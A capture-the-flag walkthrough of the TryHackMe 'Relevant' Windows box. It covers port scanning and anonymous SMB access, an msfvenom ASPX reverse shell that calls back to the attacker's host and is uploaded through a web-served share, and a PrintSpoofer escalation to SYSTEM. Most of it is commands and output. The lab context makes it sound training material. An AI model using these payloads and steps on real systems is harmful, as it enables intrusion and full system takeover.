# Relevant

![THM Room Relevant](https://i.imgur.com/AG5H2Sg.jpg)

[Play](https://tryhackme.com/room/relevant)

## 1. Enumeration & Exploration
Note: All of the below may look sequential, but are done is parallel.

### 1.1 Port Scanning

```
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-27T05:21:09+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-26T05:14:40
| Not valid after:  2021-11-25T05:14:40
| MD5:   9663 1f81 95f5 9ab8 6fb0 1d05 4847 e090
|_SHA-1: b94f 8149 8420 d35a c4f2 9bb4 969c b983 6844 bb29
|_ssl-date: 2021-05-27T05:21:48+00:00; +3s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m03s, deviation: 3h07m50s, median: 3s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-26T22:21:10-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-27T05:21:11
|_  start_date: 2021-05-27T05:15:11
```

Let's also run a full, all ports scan.

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

For ports 49663-49670 we need to run another scan to see exactly what is going on.

```
PORT      STATE    SERVICE VERSION
49663/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49664/tcp filtered unknown
49665/tcp filtered unknown
49666/tcp filtered unknown
49667/tcp filtered unknown
49668/tcp open     msrpc   Microsoft Windows RPC
49669/tcp open     msrpc   Microsoft Windows RPC
49670/tcp open     msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Sneaky! `49663` is our next target, after `80`.

### 1.2. Web Exploration + Enumeration
On port `80`,
![](https://i.imgur.com/BYHbehS.png)

The gobuster scan results nothing.

On port `49663`,
![](https://i.imgur.com/hX7GsWI.png)

Same webpage. The gobuster scan again results nothing. Clearly, this is not the path to take.


### 1.3. SMB

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.64.0 -N                               

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

The last share looks interesting.

```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.64.0/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
                7735807 blocks of size 4096. 4949166 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

Looks delicious.

```
┌──(kali㉿kali)-[/tmp]
└─$ cat passwords.txt 
[User Passwords - Encoded]
{hidden}
{hidden}
```

Looks like base64 encoded. Using psexec, we can check their strength.

```
┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 psexec.py '{user1}':'{pass1}'@10.10.64.0
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.64.0.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share nt4wrksv
[*] Uploading file bZoikejy.exe
[*] Opening SVCManager on 10.10.64.0.....
[-] Error opening SVCManager on 10.10.64.0.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
```

Looks like user1 is the right username, but the password is wrong. user2 on the other hand, 

```
┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 psexec.py '{user2}':'{pass2}'@10.10.64.0
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[-] Authenticated as Guest. Aborting
```

### 1.4. SMB + Web
A common thing to note is that the shares are shared, and can be seen over the web server. Let's try looking for the `nt4wrksv` share on both the ports.

![A screenshot of Port 80 on the server](https://i.imgur.com/0rM6FuE.png)

![A screenshot of Port 49663 on the server](https://i.imgur.com/kIurelS.png)

Great! If we can put stuff in smb somehow, we should be solid. Now, the question is, how?

```
┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ smbclient //10.10.64.0/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put test.txt 
putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \> 
```

![](https://i.imgur.com/lrXZHbH.png)

Intersting! Now the question is, what kind of shell does microsoft use for these serivces? 

[Exploiting Microsoft IIS with Metasploit](https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/) explores in depth.

We create a payload using `msfvenom` and start listening.

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.8.184 LPORT=1337 -f asp -o rev.asp  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of asp file: 53168 bytes
Saved as: rev.asp
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Uploading,
```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.64.0/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put rev.asp 
putting file rev.asp as \rev.asp (25.8 kb/s) (average 25.8 kb/s)
smb: \> 
```

and going to the page, we get an error, which redirects us to [this microsoft link](https://docs.microsoft.com/en-us/iis/application-frameworks/running-classic-asp-applications-on-iis-7-and-iis-8/classic-asp-not-installed-by-default-on-iis). This talks about how `asp` is not installed by default.

Looking it up, it looks like we need to get `aspx` instead.

## 2. Foothold
Let's do it again.

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.8.184 LPORT=1337 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3416 bytes
Saved as: rev.aspx
                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.64.0/nt4wrksv -N   
Try "help" to get a list of possible commands.
smb: \> put rev.aspx
putting file rev.aspx as \rev.aspx (2.7 kb/s) (average 2.7 kb/s)
smb: \> 
```

And ...

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.64.0] 49897
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

We are in!

## 3. PrivEsc

```
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I googled `SeImpersonatePrivilege` and I soon got to the simple command: `PrintSpoofer.exe -i -c cmd
`, taken form [PrintSpoofer](https://github.com/dievus/printspoofer).

Now, we put the file using SMB. Where is the file now, in the machine? We go to `C:/Inetpub/wwwroot/`.

```
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

05/26/2021  11:32 PM    <DIR>          .
05/26/2021  11:32 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
05/26/2021  11:28 PM            27,136 PrintSpoofer.exe
05/26/2021  11:11 PM            53,168 rev.asp
05/26/2021  11:10 PM             3,416 rev.aspx
05/26/2021  10:54 PM                51 test.txt
               5 File(s)         83,869 bytes
               2 Dir(s)  21,113,995,264 bytes free

```

Voila!

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

System Compromised :)
